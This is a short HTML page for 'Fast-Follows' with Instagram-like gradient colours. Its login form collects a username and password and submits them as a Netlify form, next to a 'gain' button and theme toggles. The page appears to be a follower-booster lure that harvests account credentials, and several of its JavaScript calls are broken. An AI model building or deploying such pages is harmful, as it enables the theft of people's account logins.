<!DOCTYPE html>
<html lang="en">
  <head>
    
    <title>private-fast-follows</title>
    <link rel="stylesheet" href="style.css">
      
<meta name="viewport" content="width=device-width, initial-scale=1">
  </head>
<body>
    <script>
      
      function lighttheme(){
        document.body.style.background="linear-gradient(45deg, #f09433 0%,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888 100%)";
        document.form.style.background="#b6c199";
      }
      function darktheme(){
        document.body.style.background="grey";
        document.body.form.style.background="grey";
        document.getElementbyId('2').style.background="#04AA6D"
      }
     function myVibrate() {
    window.navigator.vibrate(30 , 40 , 30 , 60,);
    
  }
    </script>

<h2>Fast-Follows</h2> 

<form action="other.html" method="post" netlify>
  <div class="imgcontainer">
    <img src="Light.png" alt="logo" class="avatar">
  </div>

  <div class="container">
    <label for="uname"><b>Username</b></label>
    <input type="text" placeholder="Enter Username" name="uname" required>

    <label for="psw"><b>Password</b></label>
    <input type="password" placeholder="Enter Password" name="psw" required>
        
    <button type="" onclick="myVibrate()">gain</button>
    <label>
      <input type="checkbox" checked="checked" name="remember"> safe mode
    </label>
  </div>

  
</form>

<button onclick="darktheme()" id="1">d a r k m o d e</button>
<button onclick="lighttheme()" id="2">l i g h t m o d e</button>

</body>
</html>
